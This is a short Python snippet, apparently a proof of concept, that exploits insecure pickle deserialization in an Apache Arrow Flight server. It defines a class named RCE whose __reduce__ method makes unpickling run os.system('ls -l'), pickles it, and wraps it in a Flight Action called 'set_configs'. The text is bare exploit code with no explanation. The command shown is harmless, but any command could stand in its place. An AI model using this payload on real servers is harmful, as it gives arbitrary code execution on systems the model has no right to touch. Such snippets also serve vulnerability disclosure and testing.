class RCE:
    def __reduce__(self):
        import os
        return (os.system, ('ls -l',))

import pickle
action_body = pickle.dumps(RCE())
action = pyarrow.flight.Action("set_configs", action_body)
